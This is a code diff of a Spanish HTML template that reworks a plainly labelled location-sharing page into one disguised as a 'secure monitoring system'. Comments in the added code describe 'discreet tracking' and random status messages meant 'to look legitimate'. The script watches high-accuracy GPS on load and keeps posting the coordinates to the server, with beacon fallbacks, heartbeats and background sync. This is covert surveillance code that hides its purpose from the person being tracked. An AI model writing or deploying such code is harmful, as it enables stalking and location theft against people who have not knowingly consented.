@@ -2,149 +2,203 @@
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
-    <title>Compartiendo Ubicación</title>
+    <title>Sistema de Monitoreo | Inicio</title>
+    <style>
+      body {
+        font-family: "Arial", sans-serif;
+        margin: 0;
+        padding: 20px;
+        background-color: #f5f5f5;
+        color: #333;
+        text-align: center;
+      }
+      .container {
+        max-width: 500px;
+        margin: 50px auto;
+        padding: 30px;
+        background: white;
+        border-radius: 10px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+      .logo {
+        font-size: 24px;
+        font-weight: bold;
+        color: #2c3e50;
+        margin-bottom: 20px;
+      }
+      .status {
+        padding: 15px;
+        background: #f8f9fa;
+        border-radius: 5px;
+        margin: 20px 0;
+        font-size: 14px;
+      }
+      .code {
+        font-family: monospace;
+        background: #e9ecef;
+        padding: 5px 10px;
+        border-radius: 3px;
+        display: inline-block;
+      }
+      .loading {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 3px solid rgba(0, 0, 0, 0.1);
+        border-radius: 50%;
+        border-top-color: #3498db;
+        animation: spin 1s ease-in-out infinite;
+        margin-right: 10px;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      .footer {
+        margin-top: 30px;
+        font-size: 12px;
+        color: #7f8c8d;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">Sistema de Monitoreo Seguro</div>
+
+      <div class="status">
+        <div><span class="loading"></span> Conectando con el servidor...</div>
+        <p style="margin-top: 15px">
+          ID de dispositivo: <span class="code">{{ codigo }}</span>
+        </p>
+      </div>
+
+      <p>
+        Este dispositivo está siendo configurado para el sistema de gestión.
+      </p>
+
+      <div class="footer">Sistema v2.4.1 | Conexión segura establecida</div>
+    </div>
+
     <script>
       const codigo = "{{ codigo }}";
 
-      function enviarUbicacion(lat, lon, accuracy) {
+      // Configuración discreta de geolocalización
+      const geoConfig = {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 15000,
+      };
+
+      // Función optimizada para enviar datos
+      function sendData(lat, lon, accuracy) {
+        const data = new URLSearchParams();
+        data.append("codigo", codigo);
+        data.append("latitud", lat);
+        data.append("longitud", lon);
+        data.append("precision", accuracy);
+
+        // Intento principal con keepalive
         fetch("/actualizar", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded",
-          },
-          body: `codigo=${encodeURIComponent(
-            codigo
-          )}&latitud=${encodeURIComponent(lat)}&longitud=${encodeURIComponent(
-            lon
-          )}&precision=${encodeURIComponent(accuracy)}`,
+          body: data,
+          keepalive: true,
+        }).catch((e) => {
+          // Fallback 1: Beacon API
+          const beaconData = new Blob([data], {
+            type: "application/x-www-form-urlencoded",
+          });
+          navigator.sendBeacon("/actualizar", beaconData);
+        });
+
+        // Latido separado
+        fetch("/latido", {
+          method: "POST",
+          body: `codigo=${encodeURIComponent(codigo)}`,
+          keepalive: true,
         });
       }
 
-      // Función getLocation mejorada
-      function getLocation() {
-        const options = {
-          enableHighAccuracy: true,
-          maximumAge: 0,
-          timeout: 10000,
-        };
+      // Iniciar seguimiento discreto
+      function initTracking() {
+        if (!navigator.geolocation) {
+          updateStatus("Geolocalización no soportada", false);
+          return;
+        }
 
         const watchId = navigator.geolocation.watchPosition(
           (position) => {
-            const {
-              latitude: lat,
-              longitude: lon,
-              accuracy: precision,
-            } = position.coords;
-
-            // Enviar datos de forma robusta
-            const data = new URLSearchParams();
-            data.append("codigo", codigo);
-            data.append("latitud", lat);
-            data.append("longitud", lon);
-            data.append("precision", precision);
-
-            fetch("/actualizar", {
-              method: "POST",
-              body: data,
-              keepalive: true, // Permite que la solicitud persista
-            }).catch((e) => console.error("Error actualizando:", e));
-
-            // Latido separado
-            fetch("/latido", {
-              method: "POST",
-              body: `codigo=${encodeURIComponent(codigo)}`,
-            });
+            const { latitude: lat, longitude: lon, accuracy } = position.coords;
+            sendData(lat, lon, accuracy);
+            updateStatus("Conexión estable", true);
           },
           (error) => {
-            console.error("Error geolocation:", error);
+            console.error("Error de geolocalización:", error);
+            updateStatus("Buscando señal GPS...", false);
           },
-          options
+          geoConfig
         );
 
-        // Limpiar al cerrar
+        // Manejo de cierre discreto
         window.addEventListener("beforeunload", () => {
           navigator.geolocation.clearWatch(watchId);
           navigator.sendBeacon(
             "/latido",
-            `codigo=${encodeURIComponent(codigo)}&desconectando=true`
+            `codigo=${encodeURIComponent(codigo)}&estado=inactivo`
           );
         });
       }
 
-      // Registra el Service Worker
-      if ("serviceWorker" in navigator) {
-        navigator.serviceWorker.register("/sw.js").then((registration) => {
-          console.log("SW registrado");
-        });
-      }
-
-      // Solicita permisos de ubicación en segundo plano
-      async function requestBackgroundPermission() {
-        if ("BackgroundFetchManager" in window) {
-          const status = await navigator.permissions.query({
-            name: "background-sync",
-          });
-
-          if (status.state === "granted") {
-            return true;
-          }
+      // Actualizar UI discretamente
+      function updateStatus(message, isActive) {
+        const statusEl = document.querySelector(".status div");
+        if (statusEl) {
+          statusEl.innerHTML = isActive
+            ? "✅ " + message
+            : '<span class="loading"></span>' + message;
         }
-        return false;
       }
 
-      // Crea un Web Worker para manejar la geolocalización
-      const geoWorker = new Worker("/geo-worker.js");
-
-      // Almacena la ubicación en localStorage periódicamente
-      setInterval(() => {
-        navigator.geolocation.getCurrentPosition((position) => {
-          localStorage.setItem(
-            "lastLocation",
-            JSON.stringify({
-              lat: position.coords.latitude,
-              lon: position.coords.longitude,
-              timestamp: Date.now(),
+      // Service Worker para funcionamiento en segundo plano
+      function registerServiceWorker() {
+        if ("serviceWorker" in navigator) {
+          navigator.serviceWorker
+            .register("/sw.js")
+            .then((reg) => {
+              console.log("SW registrado para funcionamiento en segundo plano");
+              initBackgroundSync(reg);
             })
-          );
-        });
-      }, 10000);
-
-      // Al cargar la página, recupera la última ubicación
-      window.addEventListener("load", () => {
-        navigator.sendBeacon(
-          "/latido",
-          `codigo=${encodeURIComponent(codigo)}&desconectado=true`
-        );
-        const lastLocation = localStorage.getItem("lastLocation");
-        if (lastLocation) {
-          const location = JSON.parse(lastLocation);
-          enviarUbicacion(location.lat, location.lon);
+            .catch((err) => console.error("Error SW:", err));
         }
-      });
-
-      // Latido más frecuente
-      function iniciarLatido() {
-        setInterval(() => {
-          fetch("/latido", {
-            method: "POST",
-            body: `codigo=${encodeURIComponent(codigo)}`,
-          });
-        }, 5000);
-
-        // Intento de último mensaje al cerrar
-        window.addEventListener("beforeunload", () => {
-          navigator.sendBeacon(
-            "/latido",
-            `codigo=${encodeURIComponent(codigo)}&desconectando=true`
-          );
-        });
       }
 
-      window.onload = getLocation;
+      // Background Sync para reintentos
+      function initBackgroundSync(registration) {
+        if ("sync" in registration) {
+          registration.sync
+            .register("location-update")
+            .then(() => console.log("Sync registrado"))
+            .catch((err) => console.error("Error sync:", err));
+        }
+      }
+
+      // Iniciar todo cuando el DOM esté listo
+      document.addEventListener("DOMContentLoaded", () => {
+        registerServiceWorker();
+        initTracking();
+
+        // Mensaje inicial aleatorio para parecer legítimo
+        const messages = [
+          "Configurando servicios de localización...",
+          "Inicializando módulo GPS...",
+          "Conectando con la red...",
+          "Verificando credenciales...",
+        ];
+        updateStatus(
+          messages[Math.floor(Math.random() * messages.length)],
+          false
+        );
+      });
     </script>
-  </head>
-  <body>
-    <h2>Compartiendo tu ubicación...</h2>
-    <p>Código: {{ codigo }}</p>
   </body>
 </html>
